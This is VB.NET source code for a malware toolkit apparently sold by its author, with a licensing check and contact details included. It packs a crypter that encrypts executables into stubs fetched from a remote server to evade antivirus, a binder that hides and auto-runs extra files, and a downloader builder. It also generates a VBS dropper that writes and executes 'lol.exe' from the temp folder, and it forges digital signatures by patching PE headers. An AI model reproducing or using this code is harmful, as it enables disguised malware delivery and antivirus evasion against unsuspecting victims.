Imports System.ComponentModel
'Get stubs here :)
'http://www.codeproject.com/KB/vb/#Visual+Basic+.NET


Public Class Form1
    Dim CurrentStub As String = ""
    Public Shared TOS As Boolean = False
    Public Shared BinderTOS As Boolean = False
    Public Shared DownloaderTOS As Boolean = False
    Function Base64Encode(ByVal TheStr As String) As String
        Dim bytesToEncode As Byte()
        bytesToEncode = System.Text.Encoding.UTF8.GetBytes(TheStr)
        Dim encodedText As String
        encodedText = Convert.ToBase64String(bytesToEncode)
        Return encodedText
    End Function
    Private Function TringToUnicodeBytes(ByVal TheStr As String) As Byte()
        Return System.Text.Encoding.Unicode.GetBytes(TheStr)
    End Function

    Private Function HexToByteArray(ByVal hex As [String]) As Byte()
        Dim bytes(0 To hex.Length / 2 - 1) As Byte
        Dim a As Integer = 0
        For i = 0 To hex.Length - 1 Step 2
            Dim f = hex.Substring(i, 2)
            bytes(a) = "&h" & f
            a += 1
        Next
        Return bytes
    End Function


    Function IsNetApp(ByRef TheFile As String)
        Dim Result As String
        Try
            Result = System.Reflection.AssemblyName.GetAssemblyName(AngelTextBox1.Text).ToString
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function

    Public Function ReadEOFData(ByRef FilePath As String) As Byte()
        Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
        Dim i As Integer = Bin.Length - 1
        Dim Found As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False

        Do Until i = 0
            If Bin(i) = &H0 Then
                If Found = False Then
                    Found = True
                Else
                    If Found2 = False Then
                        Found2 = True
                    Else
                        If Found3 = False Then
                            'exit function
                            i += 3
                            Exit Do

                        End If
                    End If
                End If
            Else
                Found = False
                Found2 = False
                Found3 = False
            End If
            i -= 1
        Loop

        Dim Size As Integer = (Bin.Length - 1) - i
        Dim OverLay(0 To Size) As Byte
        If OverLay.Length = 0 Then Return Nothing
        Dim a As Integer = 0
        Do Until i = Bin.Length - 1
            OverLay(a) = Bin(i)
            i += 1
            a += 1
        Loop
        Return OverLay
    End Function


    Public Shared Function Compress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(stream, IO.Compression.CompressionMode.Compress, True)
        zipStream.Write(bytes, 0, bytes.Length)
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Sub SignFile(ByVal TheFile As String)
        Dim TheBinToSign() As Byte = FileIO.FileSystem.ReadAllBytes(TheFile)
        Dim TheCert() As Byte = My.Resources.DigitalCert

        Dim NewBin(0 To TheBinToSign.Length + TheCert.Length - 1) As Byte
        Dim l As Integer = 0
        For i = 0 To TheBinToSign.Length - 1
            NewBin(i) = TheBinToSign(i)
            l = i
        Next
        Dim a As Integer = 0
        For i = (l + 1) To TheBinToSign.Length + TheCert.Length - 2
            NewBin(i) = TheCert(a)
            a += 1
        Next


        'add the pe infoz
        Dim AddressToPE As Integer
        Dim Found1 As Boolean = False
        Dim ix As Integer = 0
        For Each Byt In NewBin
            If Found1 = True And Byt = &H45 Then
                AddressToPE = ix - 1
                Exit For
            Else
                Found1 = False
            End If
            If Byt = &H50 Then Found1 = True
            ix += 1
        Next
        '  TextBox2.Text = "Address To PE: " & Hex(AddressToPE) & Environment.NewLine

        Dim Prt1 As Byte = TheBinToSign(AddressToPE + 4)
        Dim AddressToSection As Integer
        If Prt1 = &H4C Then
            'x32
            AddressToSection = AddressToPE + 152
        Else
            'x64
            AddressToSection = AddressToPE + 168
        End If

        'Dim AddressToSection As Integer = AddressToPE + 152 '168 for x64
        Dim TheInjection As String = Hex(TheBinToSign.Length)
        Dim TheInjectionSize As String = Hex(TheCert.Length)


        Do Until TheInjection.Length = 8
            TheInjection = "0" & TheInjection
        Loop

        Do Until TheInjectionSize.Length = 8
            TheInjectionSize = "0" & TheInjectionSize
        Loop
        Dim hexString As String = TheInjection

        Dim Byte1 As Byte = Convert.ToByte(hexString.Substring(6, 2), 16)
        Dim Byte2 As Byte = Convert.ToByte(hexString.Substring(4, 2), 16)
        Dim Byte3 As Byte = Convert.ToByte(hexString.Substring(2, 2), 16)
        Dim Byte4 As Byte = Convert.ToByte(hexString.Substring(0, 2), 16)


        NewBin(AddressToSection) = Byte1
        NewBin(AddressToSection + 1) = Byte2
        NewBin(AddressToSection + 2) = Byte3
        NewBin(AddressToSection + 3) = Byte4

        hexString = TheInjectionSize

        Byte1 = Convert.ToByte(hexString.Substring(6, 2), 16)
        Byte2 = Convert.ToByte(hexString.Substring(4, 2), 16)
        Byte3 = Convert.ToByte(hexString.Substring(2, 2), 16)
        Byte4 = Convert.ToByte(hexString.Substring(0, 2), 16)

        NewBin(AddressToSection + 4) = Byte1
        NewBin(AddressToSection + 5) = Byte2
        NewBin(AddressToSection + 6) = Byte3
        NewBin(AddressToSection + 7) = Byte4
        FileIO.FileSystem.WriteAllBytes(TheFile, NewBin, False)
    End Sub
    Public Shared Function AES_Encrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim encrypted() As Byte = DESEncrypter.TransformFinalBlock(input, 0, input.Length)
            Return encrypted
        Catch ex As Exception
            Return Nothing
        End Try

    End Function


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ListView1.Columns.Add("File Name", 100, HorizontalAlignment.Center) 'Column 1
        ListView1.Columns.Add("File Path", 100, HorizontalAlignment.Center) 'Column 2
        ListView1.Columns.Add("Execute", 100, HorizontalAlignment.Center) 'Column 3
        ListView1.Columns.Add("Drop Path", 100, HorizontalAlignment.Center)
        AngelTextBox3.Text = HWID.GetID
    End Sub

    Private Function Bytes_To_String2(ByVal bytes_Input As Byte()) As String
        Dim strTemp As New System.Text.StringBuilder(bytes_Input.Length * 2)
        For Each b As Byte In bytes_Input
            strTemp.Append(Conversion.Hex(b))
        Next
        Return strTemp.ToString()
    End Function

    Function Base64EncodeString(ByVal InputText As String)
        Dim bytesToEncode As Byte()
        bytesToEncode = System.Text.Encoding.UTF8.GetBytes(InputText)

        Dim encodedText As String
        encodedText = Convert.ToBase64String(bytesToEncode)
        Return encodedText
    End Function


    Sub LaunchProcess()
        Dim ProcPath As String = System.Threading.Thread.CurrentThread.Name
        Process.Start(ProcPath).WaitForExit()
        Try
            FileIO.FileSystem.DeleteFile(ProcPath)
        Catch ex As Exception

        End Try
    End Sub


    Public Function createScript1(sit) As String
        Dim divs = Int(UBound(sit) / 60)
        Dim Test(0 To sit.length - 1) As String
        For i = 0 To sit.length - 1
            Test(i) = Hex(sit(i))
            If Test(i).Length = 1 Then Test(i) = "0" & Test(i)
            Test(i) = Test(i)
        Next

        Dim j As Integer
        For i = 1 To divs
            j = i * 60
            Test(j) = Test(j) & """" & vbCrLf & "t=t&"""
        Next
        Dim sData = "t=""" & Join(Test, ",") & """" & vbCrLf

        Dim depress = "\ntmp = Split(t, \q,\q)\nSet fso = CreateObject(\qScripting.FileSystemObject\q)\n" _
         & "pth = \q*****\q\nSet f = fso.CreateTextFile(pth, ForWriting)\n" _
         & "For i = 0 To UBound(tmp)\n\tl = Len(tmp(i))\n\tb = Int(\q&H\q & Left(tmp(i), 2))\n" _
         & "\tIf l > 2 Then\n\t\tr = Int(\q&H\q & Mid(tmp(i), 3, l))\n\t\tFor j = 1 To r\n\t\t" _
         & "f.Write Chr(b)\n\t\tNext\n\tElse\n\t\tf.Write Chr(b)\n\tEnd If\nNext\nf.Close\n"
        depress = depress & "WScript.CreateObject(\qWScript.Shell\q).run(pth)"
        depress = br(depress)
        Dim exeName = "fso.getspecialfolder(2) & ""\" & "lol.exe" & """"
        depress = Replace(depress, """*****""", exeName)
        Return sData & depress & vbLf & "WScript.CreateObject(""WScript.Shell"").run(pth)"
    End Function

    Public Function br(it)
        Dim tmp = Replace(it, "\n", vbCrLf)
        tmp = Replace(tmp, "\t", vbTab)
        tmp = Replace(tmp, "\q", """")
        Return tmp
    End Function


    Private Sub AngelButton1_Click(sender As Object, e As EventArgs) Handles AngelButton1.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .FileName = ""
            .Title = "Select file to crypt"
            .ShowDialog()
        End With
        If OFD.FileName <> "" Then
            AngelTextBox1.Text = OFD.FileName
        End If
    End Sub

    Private Sub AngelButton2_Click(sender As Object, e As EventArgs) Handles AngelButton2.Click
        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe", My.Resources.Exidous_AV_Checker, False)
        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe"
        TI.Start()
    End Sub

    Private Sub AngelButton3_Click(sender As Object, e As EventArgs) Handles AngelButton3.Click
        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe", My.Resources.ShortCut_Exploit, False)
        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe"
        TI.Start()
    End Sub

    Private Sub AngelButton4_Click(sender As Object, e As EventArgs) Handles AngelButton4.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .FileName = ""
            .Title = "Select exe"
            .ShowDialog()
        End With
        If OFD.FileName <> "" Then
            Dim SFD As New SaveFileDialog
            With SFD
                .FileName = "lol.vbs"
                .Title = "Save As vbs"
                .ShowDialog()
            End With
            Dim tmp2 As String

            tmp2 = createScript1(FileIO.FileSystem.ReadAllBytes(OFD.FileName))
            FileIO.FileSystem.WriteAllText(SFD.FileName, tmp2, False, System.Text.Encoding.ASCII)
            MsgBox("Saved as " & SFD.FileName)
        End If
    End Sub

    Private Sub AngelButton5_Click(sender As Object, e As EventArgs) Handles AngelButton5.Click
        If TOS = False Then
            Dim R As New frmTOS
            R.CrypterAgreement = True
            R.ShowDialog()
            If TOS = False Then Exit Sub
        End If

        Dim StubStr As String = "http://intellisence.ddns.net/Crypter/index.php"
        Dim WC As New System.Net.WebClient
        StubStr = WC.DownloadString(StubStr & "?key=" & HWID.GetID & "&list_users=fuckingtrue")
        If StubStr.Contains("WRONG KEY OR NO KEYS EXIST") Then
            MsgBox("You will need to purchase stubs to use the crypter! Please contact exidous!" & Environment.NewLine & "Skype: exidous1" & Environment.NewLine & "Jabber: exidous@jabb3r.org" & Environment.NewLine & "Email: exidous2008@gmail.com" & Environment.NewLine & "Your hardware id has been copied to the clipboard!" & Environment.NewLine & "HWID: " & HWID.GetID)
            Clipboard.Clear()
            Clipboard.SetText(HWID.GetID)
            Exit Sub
        End If
        Dim stub As Byte() = HexToByteArray(StubStr) 'Convert.FromBase64String(StubStr)

        ' Dim Stub() As Byte
        If AngelTextBox1.Text = "" Then Exit Sub

        Dim SFD As New SaveFileDialog
        With SFD
            .FileName = ""
            .Title = "Save Crypted File As"
            .ShowDialog()
        End With
        If SFD.FileName <> "" Then
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, stub, False)
            If AngelCheckBox1.Checked = True Then
                Dim TestDialog As New FrmClone
                TestDialog.TextBox2.Text = SFD.FileName
                If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
                End If
                TestDialog.Dispose()
            End If


            If IsNetApp(AngelTextBox1.Text) Then
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
            Else
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
            End If
            If AngelCheckBox7.Checked = True Then
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
                If AngelCheckBox8.Checked = True Then
                    FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
                Else
                    FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
                End If
            Else
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
            End If


            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)

            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Compress(AES_Encrypt(FileIO.FileSystem.ReadAllBytes(AngelTextBox1.Text))), True)
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
            Application.DoEvents()
            System.Threading.Thread.Sleep(50)

            'replace EOF data
            Dim OverLay() As Byte = ReadEOFData(AngelTextBox1.Text)
            If OverLay Is Nothing Then
            Else
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, OverLay, True)
            End If
            If AngelCheckBox2.Checked = True Then
                SignFile(SFD.FileName)
            End If

            MsgBox("Saved As: " & SFD.FileName)

        End If
    End Sub

    Private Sub AngelButton9_Click(sender As Object, e As EventArgs) Handles AngelButton9.Click
        Clipboard.Clear()
        Clipboard.SetText(AngelTextBox3.Text)
    End Sub

    Private Sub AngelButton6_Click(sender As Object, e As EventArgs) Handles AngelButton6.Click
        Dim Ofd As New OpenFileDialog
        With Ofd
            .Title = "Select file to add"
            .FileName = ""
            .ShowDialog()
        End With
        If Ofd.FileName <> "" Then
            Dim FilePath As String = Ofd.FileName
            Dim Execute As String = ""
            Dim PrePath As String = Strings.Left(FilePath, FilePath.LastIndexOf("\") + 1)
            Dim FileName As String = Replace(Ofd.FileName, PrePath, "")
            Dim answer = MsgBox("Execute file?", vbYesNo, "Execute File?")
            If answer = vbYes Then
                Execute = "True"
            Else
                Execute = "False"
            End If
            '  ListBox1.Items.Add(Cmds)

            Dim str(3) As String
            Dim itm As ListViewItem
            str(0) = FileName
            str(1) = FilePath
            str(2) = Execute
            str(3) = ComboBox1.Text

            itm = New ListViewItem(str)
            ListView1.Items.Add(itm)
        End If
    End Sub

    Private Sub AngelButton7_Click(sender As Object, e As EventArgs) Handles AngelButton7.Click
        If BinderTOS = False Then
            Dim R As New frmTOS
            R.BinderAgreement = True
            R.ShowDialog()
            If BinderTOS = False Then Exit Sub
        End If
        Dim AppendBytes() As Byte = {}
        Dim SFD As New SaveFileDialog
        With SFD
            .FileName = ""
            .Title = "Save As"
            .ShowDialog()
        End With
        If SFD.FileName = "" Then Exit Sub
        'write the stub
        FileIO.FileSystem.WriteAllBytes(SFD.FileName, My.Resources.BndrStub, False)
        If AngelCheckBox4.Checked = True Then
            Dim TestDialog As New FrmClone
            TestDialog.TextBox2.Text = SFD.FileName
            If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
            End If
            TestDialog.Dispose()
        End If
        Dim tst() As String = {}
        For xc = 0 To ListView1.Items.Count - 1
            Dim LstVitm As ListViewItem = ListView1.Items.Item(xc)
            Dim FileName As String = LstVitm.SubItems(0).Text
            Dim FilePath As String = LstVitm.SubItems(1).Text
            Dim Exec As String = LstVitm.SubItems(2).Text
            Dim DropPath As String = LstVitm.SubItems(3).Text
            Dim Execute As Boolean = Boolean.Parse(Exec)
            Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
            Bin = AES_Encrypt(Bin)
            Dim SplitChar() As Byte = TringToUnicodeBytes("!(!(!" & Execute & "!(!(!" & DropPath & "!(!(!" & FileName & "!(!(!")
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitChar, True)
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, True)
            Dim SplitCharz() As Byte = TringToUnicodeBytes("!(!(!")
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitCharz, True)
        Next
        If AngelCheckBox5.Checked = True Then
            SignFile(SFD.FileName)
        End If
        MsgBox("Saved As " & SFD.FileName)
    End Sub

    Private Sub AngelButton8_Click(sender As Object, e As EventArgs) Handles AngelButton8.Click
        If DownloaderTOS = False Then
            Dim R As New frmTOS
            R.DownloaderAgreement = True
            R.ShowDialog()
            If DownloaderTOS = False Then Exit Sub
        End If
        Dim Bin() As Byte = My.Resources.DwnldrStub

        Dim BytesToWrite() As Byte = System.Text.Encoding.Unicode.GetBytes("!~!" & Base64EncodeString(AngelTextBox2.Text) & "!~!")

        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim CurrentPosition As Integer = 0
        For Each byt In Bin
            If Found1 = False Then
                If byt = &H58 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If byt = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If byt = &H58 Then
                            Found3 = True
                            CurrentPosition = CurrentPosition - 2
                            Exit For
                        Else
                            Found2 = False
                            Found1 = False
                        End If
                    End If
                End If
            End If
            CurrentPosition += 1
        Next

        Dim CurPos As Integer = 0
        For Each byt In BytesToWrite
            Bin(CurrentPosition + CurPos) = BytesToWrite(CurPos)
            CurPos += 1
        Next
        Dim SFD As New SaveFileDialog()
        With SFD
            .Title = "Save As"
            .FileName = "downloader.exe"
            .ShowDialog()
        End With
        FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, False)
        If AngelCheckBox3.Checked = True Then
            Dim TestDialog As New FrmClone
            TestDialog.TextBox2.Text = SFD.FileName
            If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
            End If
            TestDialog.Dispose()
        End If

        If AngelCheckBox6.Checked = True Then
            SignFile(SFD.FileName)
        End If
        MsgBox("Saved As " & SFD.FileName)
    End Sub

    Private Sub AngelCheckBox7_CheckedChanged(sender As Object) Handles AngelCheckBox7.CheckedChanged
        If AngelCheckBox7.Checked = False Then
            If AngelCheckBox8.Checked = True Then
                AngelCheckBox8.Checked = False

            End If
            AngelCheckBox8.Enabled = False
        Else
            AngelCheckBox8.Enabled = True
        End If
    End Sub
End Class

Class HWID

    Shared Function GetID() As String
        Dim ID As String = SystemSerialNumber() & CpuId()
        Return ID
    End Function
    Private Shared Function SystemSerialNumber() As String
        ' Get the Windows Management Instrumentation object.
        Dim wmi As Object = GetObject("WinMgmts:")

        ' Get the "base boards" (mother boards).
        Dim serial_numbers As String = ""
        Dim mother_boards As Object =
            wmi.InstancesOf("Win32_BaseBoard")
        For Each board As Object In mother_boards
            serial_numbers &= ", " & board.SerialNumber
        Next board
        If serial_numbers.Length > 0 Then serial_numbers =
            serial_numbers.Substring(2)

        Return serial_numbers
    End Function

    Private Shared Function CpuId() As String
        Dim computer As String = "."
        Dim wmi As Object = GetObject("winmgmts:" &
            "{impersonationLevel=impersonate}!\\" &
            computer & "\root\cimv2")
        Dim processors As Object = wmi.ExecQuery("Select * from " &
            "Win32_Processor")

        Dim cpu_ids As String = ""
        For Each cpu As Object In processors
            cpu_ids = cpu_ids & ", " & cpu.ProcessorId
        Next cpu
        If cpu_ids.Length > 0 Then cpu_ids =
            cpu_ids.Substring(2)

        Return cpu_ids
    End Function
End Class